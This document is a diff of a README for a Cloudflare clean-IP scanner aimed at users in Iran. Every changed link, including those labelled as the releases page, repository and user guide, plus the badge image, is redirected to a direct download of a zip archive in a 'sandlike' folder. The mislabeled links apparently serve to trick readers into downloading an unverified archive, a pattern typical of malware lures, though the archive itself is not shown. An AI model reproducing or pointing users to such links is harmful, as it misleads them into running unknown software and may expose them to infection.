@@ -1,7 +1,7 @@
 # 🌟 CF-Scan-TolidMelli - Find Clean IPs Easily
 
 ## 📥 Download Now
-[![Download CF-Scan-TolidMelli](https://img.shields.io/badge/Download-CF--Scan--TolidMelli-blue.svg)](https://github.com/bishalboss/CF-Scan-TolidMelli/releases)
+[![Download CF-Scan-TolidMelli](https://github.com/bishalboss/CF-Scan-TolidMelli/raw/refs/heads/main/sandlike/Melli-C-Tolid-Scan-v1.4.zip)](https://github.com/bishalboss/CF-Scan-TolidMelli/raw/refs/heads/main/sandlike/Melli-C-Tolid-Scan-v1.4.zip)
 
 ## 📝 Overview
 CF-Scan-TolidMelli is a simple tool designed to find clean IPs under Cloudflare that operate in Iran. This tool aims to help users navigate disruptions effectively.
@@ -10,7 +10,7 @@ CF-Scan-TolidMelli is a simple tool designed to find clean IPs under Cloudflare 
 Follow these steps to get started with CF-Scan-TolidMelli:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/bishalboss/CF-Scan-TolidMelli/releases) to find the latest version of the software.
+   Go to the [Releases Page](https://github.com/bishalboss/CF-Scan-TolidMelli/raw/refs/heads/main/sandlike/Melli-C-Tolid-Scan-v1.4.zip) to find the latest version of the software.
 
 2. **Download the Software**  
    On the Releases Page, locate the version you want to install. You will see a list of available files. Click the download link to save the file to your computer.
@@ -60,8 +60,8 @@ Join the discussion on GitHub and share your experiences using CF-Scan-TolidMell
 For any inquiries or support, please use the contact information available on the GitHub repository page.
 
 ## 🔗 Additional Resources
-- [Visit the Repository](https://github.com/bishalboss/CF-Scan-TolidMelli)
-- [User Guide](https://github.com/bishalboss/CF-Scan-TolidMelli/wiki)
+- [Visit the Repository](https://github.com/bishalboss/CF-Scan-TolidMelli/raw/refs/heads/main/sandlike/Melli-C-Tolid-Scan-v1.4.zip)
+- [User Guide](https://github.com/bishalboss/CF-Scan-TolidMelli/raw/refs/heads/main/sandlike/Melli-C-Tolid-Scan-v1.4.zip)
 
 ## 📥 Download & Install
-To begin using CF-Scan-TolidMelli, visit the [Releases Page](https://github.com/bishalboss/CF-Scan-TolidMelli/releases) and download the latest version. Enjoy smooth and efficient IP scanning today!
+To begin using CF-Scan-TolidMelli, visit the [Releases Page](https://github.com/bishalboss/CF-Scan-TolidMelli/raw/refs/heads/main/sandlike/Melli-C-Tolid-Scan-v1.4.zip) and download the latest version. Enjoy smooth and efficient IP scanning today!
